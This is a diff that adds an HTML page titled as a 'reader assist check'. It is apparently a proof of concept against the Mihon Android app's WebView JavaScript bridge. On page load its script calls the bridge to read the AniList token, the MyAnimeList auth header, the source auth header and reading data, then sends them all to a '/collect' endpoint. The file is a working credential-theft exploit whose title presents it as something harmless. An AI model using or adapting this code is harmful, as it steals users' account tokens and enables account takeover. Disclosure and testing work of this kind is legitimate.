@@ -1,0 +1,41 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Mihon reader assist check</title>
+</head>
+<body>
+  <pre id="status">waiting for bridge...</pre>
+  <script>
+    function collect(payload) {
+      var encoded = encodeURIComponent(JSON.stringify(payload, null, 2));
+      fetch("/collect?d=" + encoded).catch(function () {
+        new Image().src = "/collect?d=" + encoded;
+      });
+    }
+
+    function run() {
+      var status = document.getElementById("status");
+      if (!window.mihonAndroidBridge) {
+        status.textContent = "mihonAndroidBridge is not available";
+        collect({ error: "bridge unavailable", href: location.href });
+        return;
+      }
+
+      var payload = {
+        href: location.href,
+        currentChapter: window.mihonAndroidBridge.getCurrentChapter(),
+        readingProgress: window.mihonAndroidBridge.getReadingProgress(),
+        services: window.mihonAndroidBridge.getAvailableTrackServices(),
+        anilistToken: window.mihonAndroidBridge.getTrackToken("anilist"),
+        myanimelistAuthHeader: window.mihonAndroidBridge.getTrackAuthHeader("myanimelist"),
+        sourceAuthHeader: window.mihonAndroidBridge.getSourceAuthHeader()
+      };
+      status.textContent = JSON.stringify(payload, null, 2);
+      collect(payload);
+    }
+
+    setTimeout(run, 500);
+  </script>
+</body>
+</html>
